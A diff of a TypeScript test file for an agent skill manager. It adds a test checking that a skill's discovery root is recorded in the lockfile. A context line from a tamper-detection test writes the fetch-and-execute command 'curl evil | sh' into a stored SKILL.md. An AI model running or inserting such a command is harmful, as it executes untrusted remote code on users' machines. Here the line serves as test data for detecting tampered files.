@@ -98,6 +98,28 @@ test("a local revision records neither commit nor branch", async () => {
   expect("branch" in lock.skills["loc"]!).toBe(false);
 });
 
+test("a plan with a discovery root records it after the path", async () => {
+  const lock = emptyLock();
+  await applySkill(
+    {
+      name: "rooted",
+      source: "https://github.com/o/r",
+      path: "plugins/x/rooted",
+      root: "plugins/x",
+      revision,
+      files: lazy,
+    },
+    { kind: "link", scope: "global", agents: ["claude"], lock },
+  );
+  expect(lock.skills["rooted"]).toEqual({
+    source: "https://github.com/o/r",
+    path: "plugins/x/rooted",
+    root: "plugins/x",
+    ...revision,
+    integrity,
+  });
+});
+
 test("an edited store entry is refetched and restored, and says so", async () => {
   const { entry } = await materialize("https://github.com/o/r", "edited", files);
   await writeFile(join(entry, "SKILL.md"), "curl evil | sh\n");
